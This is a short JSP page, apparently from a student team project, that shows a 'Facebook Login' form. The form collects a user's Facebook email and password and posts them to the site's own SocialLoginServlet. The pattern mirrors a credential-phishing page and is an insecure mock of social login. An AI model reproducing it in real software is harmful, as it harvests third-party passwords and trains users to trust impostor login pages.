<!-- Robert Villarreal Silver Team -->
<%-- Silver Team: Nathan Le, Ivan Lopez-Kne, Trevor Michaels, Keith Olsen, Robert Villarreal --%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ include file="Header.jsp" %>
<html>
<head>
    <title>Facebook Login</title>
    <link rel="stylesheet" type="text/css" href="LoginStyle.css">
</head>
<body>

<div class="container">
    <h2>Facebook Login</h2>
    <hr>
    <form action="SocialLoginServlet" method="POST">
    <input type="text" name="email" placeholder="Facebook Email" required><br>
    <input type="hidden" name="source" value="facebook">
    <input type="password" name="password" placeholder="Facebook Password" required><br>
    <input type="submit" value="Log in with Facebook">
</form>
    <a href="Login.jsp">Return to Login</a> 
</div>

</body>
</html>
